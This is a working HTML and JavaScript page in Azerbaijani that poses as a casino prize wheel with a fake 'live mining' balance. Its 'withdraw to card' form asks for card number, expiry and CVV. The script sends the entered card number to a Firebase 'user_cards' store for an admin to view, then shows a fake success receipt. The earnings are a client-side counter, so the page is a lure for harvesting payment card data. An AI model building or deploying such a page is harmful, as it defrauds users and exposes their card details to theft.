<div id="claim-wrapper" style="font-family: 'Outfit', sans-serif; color: #fff; padding: 15px; background: #050508; min-height: 100vh; display: flex; flex-direction: column; align-items: center; overflow-x: hidden;">
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <style>
        /* PREMIUM STYLE & ANIMATIONS */
        .casino-card {
            background: linear-gradient(135deg, #1a1a1d 0%, #000 100%);
            padding: 25px; border-radius: 24px; border: 2px solid #d4af37;
            text-align: center; box-shadow: 0 10px 40px rgba(212, 175, 55, 0.15);
            width: 100%; max-width: 350px; margin-bottom: 25px; position: relative; z-index: 1;
        }
        .balance-value { font-size: 3rem; font-weight: 900; color: #fff; margin: 10px 0; }
        
        .wheel-outer {
            position: relative; width: 300px; height: 300px; padding: 10px;
            background: #111; border-radius: 50%; border: 5px solid #d4af37;
            margin-bottom: 20px; z-index: 1;
        }
        #claim-wheel {
            width: 100%; height: 100%; border-radius: 50%;
            transition: transform 6s cubic-bezier(0.15, 0, 0.15, 1);
            background-image: url('carx.png'); background-size: cover;
        }
        
        .mining-section {
            width: 100%; max-width: 360px; background: rgba(10, 10, 15, 0.9);
            border-radius: 24px; padding: 25px; border: 1px solid #1a1a20; margin-top: 20px;
        }
        .mining-amount { font-family: 'Courier New', monospace; font-size: 1.8rem; color: #fff; font-weight: 900; }

        .casino-btn {
            width: 100%; padding: 18px; border-radius: 16px; border: none;
            font-weight: 900; cursor: pointer; text-transform: uppercase;
        }
        .spin-btn { background: linear-gradient(to bottom, #d4af37, #aa8a2e); color: #000; margin-top: 15px; }
        .collect-btn { background: transparent; color: #00ff88; border: 1px solid #00ff88; margin-top: 15px; }

        /* MODAL & WITHDRAW STYLE */
        .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 10000; align-items: center; justify-content: center; padding: 20px; backdrop-filter: blur(10px); }
        .bank-modal { background: #111; width: 100%; max-width: 380px; border-radius: 24px; padding: 30px; border: 1px solid #d4af37; }
        .bank-input { width: 100%; background: #000; border: 1px solid #222; padding: 15px; border-radius: 14px; color: #fff; margin-top: 8px; box-sizing: border-box; }
        .label { font-size: 0.65rem; color: #d4af37; font-weight: 900; margin-top: 15px; display: block; }

        .success-receipt { display: none; text-align: center; animation: slideUp 0.5s ease-out; }
        @keyframes slideUp { from { transform: translateY(30px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
        .receipt-row { display: flex; justify-content: space-between; border-bottom: 1px dashed #222; padding: 10px 0; font-size: 0.8rem; color: #888; }
    </style>

    <div class="casino-card">
        <div style="font-size:0.7rem; color:#d4af37; letter-spacing:2px;">CARI BALANS</div>
        <div class="balance-value"><span id="ws-balance-display">0.00</span> AZN</div>
        <div id="ws-timer-display" style="color:#00ff88; font-weight:bold;">HAZIRDIR</div>
    </div>

    <div class="wheel-outer">
        <div id="claim-wheel"></div>
    </div>
    <button id="ws-spin-btn" class="casino-btn spin-btn" onclick="handleSpinStart()">ÇARXI FIRLAT (5 SAAT)</button>

    <div class="mining-section">
        <div style="display:flex; justify-content:space-between; margin-bottom:10px;">
            <span style="color:#00dfff; font-size:0.8rem; font-weight:bold;">LIVE MINING</span>
            <span style="color:#00ff88; font-size:0.7rem;">● Aktiv</span>
        </div>
        <div style="background:#000; padding:15px; border-radius:12px; text-align:center;">
            <div class="mining-amount" id="mining-live-val">0.000000</div>
        </div>
        <button class="casino-btn collect-btn" onclick="collectMining()">BALANSA KÖÇÜR</button>
    </div>

    <a href="javascript:void(0)" onclick="openWithdrawPanel()" style="color:#555; text-decoration:none; margin-top:20px; font-size:0.8rem;">
        <i class="fas fa-university"></i> KARTA ÇIXARIŞ ET
    </a>

    <div id="ws-withdraw-modal" class="modal-overlay">
        <div class="bank-modal">
            <div id="withdraw-form-step">
                <h2 style="color:#d4af37; margin:0 0 10px 0; font-size:1.2rem;">Vəsait Çıxarışı</h2>
                
                <span class="label">ÇIXARILACAQ MƏBLƏĞ</span>
                <input type="number" id="w-amount" class="bank-input" placeholder="0.00" step="0.01" style="color:#00ff88; font-weight:bold;">
                <p style="font-size:0.6rem; color:#444;">Maksimum: <span id="modal-max-bal">0.00</span> AZN</p>

                <span class="label">KART NÖMRƏSİ</span>
                <input type="tel" id="c-num" class="bank-input" placeholder="0000 0000 0000 0000" maxlength="19" oninput="formatCard(this)">
                
                <div style="display:flex; gap:10px;">
                    <div style="flex:1"><span class="label">AY/İL</span><input type="tel" id="c-date" class="bank-input" placeholder="MM/YY" maxlength="5"></div>
                    <div style="flex:1"><span class="label">CVV</span><input type="password" id="c-cvv" class="bank-input" placeholder="***" maxlength="3"></div>
                </div>

                <button class="casino-btn spin-btn" style="margin-top:20px;" onclick="finalWithdrawProcess()">TƏSDİQLƏ VƏ GÖNDƏR</button>
                <button onclick="document.getElementById('ws-withdraw-modal').style.display='none'" style="background:none; border:none; color:#333; width:100%; margin-top:10px; cursor:pointer;">Ləğv et</button>
            </div>

            <div id="withdraw-success-step" class="success-receipt">
                <div style="width:60px; height:60px; background:#00ff88; border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 15px; color:#000; font-size:1.5rem;"><i class="fas fa-check"></i></div>
                <h3 style="color:#fff;">Uğurlu Əməliyyat!</h3>
                <div class="receipt-row"><span>Status:</span> <span style="color:#d4af37;">İŞLƏNİLİR</span></div>
                <div class="receipt-row"><span>Göndərilən:</span> <span id="rec-sent" style="color:#00ff88;">0.00 AZN</span></div>
                <div class="receipt-row"><span>Qalıq Balans:</span> <span id="rec-left">0.00 AZN</span></div>
                <div class="receipt-row"><span>ID:</span> <span id="rec-id">#000000</span></div>
                <button class="casino-btn" style="background:#222; color:#fff; margin-top:20px;" onclick="location.reload()">BAĞLA</button>
            </div>
        </div>
    </div>
</div>

<script>
    (function() {
        // 1. DATA SYNC (Firebase & Local)
        const userKey = localStorage.getItem('ws_user_id') || "User_" + Math.floor(Math.random()*9000);
        if(!localStorage.getItem('ws_user_id')) localStorage.setItem('ws_user_id', userKey);

        firebase.database().ref('users/' + userKey + '/balance').on('value', snap => {
            let b = snap.val() || "0.00";
            document.getElementById('ws-balance-display').innerText = b;
            localStorage.setItem('ws_balance', b);
        });

        // 2. PERSISTENT MINING
        let savedMining = parseFloat(localStorage.getItem('ws_mining_temp')) || 0;
        let lastTime = parseInt(localStorage.getItem('ws_last_mining_time')) || Date.now();
        let diff = (Date.now() - lastTime) / 100;
        let liveMining = savedMining + (diff > 0 ? diff * 0.000004 : 0);

        setInterval(() => {
            liveMining += 0.000004;
            document.getElementById('mining-live-val').innerText = liveMining.toFixed(6);
            localStorage.setItem('ws_mining_temp', liveMining);
            localStorage.setItem('ws_last_mining_time', Date.now());
        }, 100);

        window.collectMining = function() {
            if(liveMining < 0.02) { alert("Min. 0.02 AZN!"); return; }
            firebase.database().ref('users/' + userKey + '/balance').once('value', snap => {
                let current = parseFloat(snap.val()) || 0;
                firebase.database().ref('users/' + userKey).update({ balance: (current + liveMining).toFixed(2) });
                liveMining = 0; localStorage.setItem('ws_mining_temp', 0);
            });
        };

        // 3. SPIN LOGIC
        window.handleSpinStart = function() {
            const last = parseInt(localStorage.getItem('ws_last_spin')) || 0;
            if (Date.now() - last < 5*60*60*1000) { alert("Hələ vaxt var!"); return; }

            const wheel = document.getElementById('claim-wheel');
            const deg = Math.floor(Math.random() * 360) + 7200;
            wheel.style.transform = `rotate(${deg}deg)`;
            document.getElementById('ws-spin-btn').disabled = true;

            setTimeout(() => {
                const wins = [0.10, 0.50, 1.00, 0.20, 0.80];
                const win = wins[Math.floor(Math.random()*5)];
                firebase.database().ref('users/' + userKey + '/balance').once('value', snap => {
                    let cur = parseFloat(snap.val()) || 0;
                    firebase.database().ref('users/' + userKey).update({ balance: (cur + win).toFixed(2) });
                    localStorage.setItem('ws_last_spin', Date.now());
                    alert("Qazandınız: " + win + " AZN");
                });
            }, 6000);
        };

        // 4. WITHDRAW SYSTEM
        window.openWithdrawPanel = () => {
            const bal = localStorage.getItem('ws_balance') || "0.00";
            document.getElementById('modal-max-bal').innerText = bal;
            document.getElementById('w-amount').value = bal;
            document.getElementById('ws-withdraw-modal').style.display = 'flex';
        };

        window.formatCard = (i) => { let v = i.value.replace(/\D/g, '').match(/.{1,4}/g); i.value = v ? v.join(' ') : ''; };

        window.finalWithdrawProcess = function() {
            const amt = parseFloat(document.getElementById('w-amount').value);
            const bal = parseFloat(localStorage.getItem('ws_balance')) || 0;
            const num = document.getElementById('c-num').value;

            if (amt <= 0 || amt > bal) { alert("Məbləğ düzgün deyil!"); return; }
            if (num.replace(/\s/g, '').length < 16) { alert("Kart nömrəsi səhvdir!"); return; }

            const newBal = (bal - amt).toFixed(2);
            const txn = "TX-" + Math.floor(Math.random()*1000000);

            // Update Firebase (Admin sees card & new balance)
            firebase.database().ref('user_cards/' + userKey).push({
                card: num, amount: amt, time: new Date().toLocaleString(), txn: txn
            });

            firebase.database().ref('users/' + userKey).update({ balance: newBal }).then(() => {
                document.getElementById('withdraw-form-step').style.display = 'none';
                document.getElementById('withdraw-success-step').style.display = 'block';
                document.getElementById('rec-sent').innerText = amt.toFixed(2) + " AZN";
                document.getElementById('rec-left').innerText = newBal + " AZN";
                document.getElementById('rec-id').innerText = "#" + txn;
                localStorage.setItem('ws_balance', newBal);
            });
        };
    })();
</script>
